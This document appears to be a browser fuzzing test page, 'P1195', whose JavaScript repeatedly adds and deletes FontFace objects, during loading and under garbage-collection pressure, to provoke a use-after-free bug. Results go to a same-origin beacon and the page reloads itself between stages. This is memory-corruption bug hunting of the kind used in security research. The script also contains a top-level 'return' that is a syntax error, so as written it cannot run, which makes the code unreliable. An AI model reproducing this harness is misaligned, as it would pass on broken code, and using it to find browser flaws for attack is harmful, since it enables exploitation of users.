<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1195 FontFace Adopt/Readd Churn</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1195 — FONTFACE ADOPT/READD CHURN</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1195-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* P1195: FontFace adopt/readd churn — a removed JS FontFace re-added to
   the set transitions through FontFace::adopt (backing swap). Churn it
   under load + with GC to seek the transition UAF. */
var STAGES=['readd1','readdLoad','readd50','readdGC','dualSet'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1195_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1195_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]);
setStatus('STAGE '+stage+'/4 — '+STAGES[stage]);

if(stage>=STAGES.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1195_stage');}catch(e){}
}else{
try{localStorage.setItem('p1195_stage',''+(stage+1));}catch(e){}
var cur=STAGES[stage];

function done(rep){
  results.push({stage:stage,name:cur,result:rep});
  try{localStorage.setItem('p1195_res',JSON.stringify(results));}catch(e){}
  B('RESULT',rep.slice(0,700));
  addFind(cur+': '+rep.slice(0,300));
  setStatus(rep.slice(0,80));
  log('=== '+cur+' -> '+rep+' ===','ok');
  B('NEXT');setTimeout(function(){location.reload(true);},700);
}
function gcP(){for(var g=0;g<2000;g++){var t=new ArrayBuffer(2048);t=null;}}

if(cur==='readd1'){
  setPhase('single readd');
  var rep='';
  try{
    var ff=new FontFace('rd1','local(Courier)');
    document.fonts.add(ff);
    document.fonts.delete(ff);
    document.fonts.add(ff);
    void ff.loaded;
    rep='SURVIVED|status='+ff.status;
  }catch(e){rep='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
  done(rep);
}else if(cur==='readdLoad'){
  setPhase('readd during load');
  var rep2='';
  try{
    var ff2=new FontFace('rd2','local(Arial)');
    document.fonts.add(ff2);
    var p=ff2.load();
    document.fonts.delete(ff2);
    document.fonts.add(ff2);
    p.then(function(){rep2='SURVIVED-loaded';done(rep2);},
           function(e){rep2='rejected:'+e.name;done(rep2);});
    return;
  }catch(e){rep2='THROW:'+e.constructor.name;}
  done(rep2);
}else if(cur==='readd50'){
  setPhase('50x readd churn');
  var rep3='';
  try{
    var ff3=new FontFace('rd3','local(Courier)');
    for(var i=0;i<50;i++){
      document.fonts.add(ff3);
      document.fonts.delete(ff3);
    }
    document.fonts.add(ff3);
    rep3='SURVIVED-50|size='+document.fonts.size;
  }catch(e){rep3='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
  done(rep3);
}else if(cur==='readdGC'){
  setPhase('readd + GC pressure');
  var rep4='';
  try{
    var ff4=new FontFace('rd4','local(Courier)');
    document.fonts.add(ff4);
    document.fonts.delete(ff4);
    gcP();
    document.fonts.add(ff4);
    void ff4.loaded;
    rep4='SURVIVED|status='+ff4.status;
  }catch(e){rep4='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
  done(rep4);
}else if(cur==='dualSet'){
  setPhase('dual-set churn');
  var rep5='';
  try{
    var fa=new FontFace('rdA','local(Arial)');
    var fb=new FontFace('rdB','local(Times New Roman)');
    document.fonts.add(fa);document.fonts.add(fb);
    for(var j=0;j<30;j++){
      document.fonts.delete(fa);
      document.fonts.delete(fb);
      document.fonts.add(fa);
      document.fonts.add(fb);
    }
    void fa.loaded;void fb.loaded;
    rep5='SURVIVED|size='+document.fonts.size;
  }catch(e){rep5='THROW:'+e.constructor.name+':'+String(e.message).slice(0,30);}
  done(rep5);
}
} /* stage machine */

(function(){
  var cur='P1195-readd-churn';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
